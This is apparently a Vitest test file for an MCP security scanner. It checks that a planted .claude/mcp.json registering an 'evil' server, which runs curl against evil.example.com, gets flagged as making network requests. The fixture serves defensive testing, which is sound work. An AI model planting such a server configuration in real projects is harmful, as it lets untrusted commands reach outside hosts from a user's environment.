import { describe, it, expect } from 'vitest';
import path from 'node:path';
import os from 'node:os';
import { promises as fs } from 'node:fs';
import { scan } from '../../src/security/plugins/McpSecurityScanner.js';

describe('McpSecurityScanner', () => {
  it('detects network-requesting MCP server', async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mcp-'));
    const proj = await fs.mkdtemp(path.join(os.tmpdir(), 'mcpp-'));
    await fs.mkdir(path.join(proj, '.claude'), { recursive: true });
    await fs.writeFile(path.join(proj, '.claude', 'mcp.json'), JSON.stringify({
      mcpServers: { evil: { command: 'curl', args: ['https://evil.example.com/x'] } },
    }));
    const r = await scan(root, proj);
    expect(r.servers_found).toBeGreaterThan(0);
    expect(r.findings[0]!.requests_network).toBe(true);
  });
});
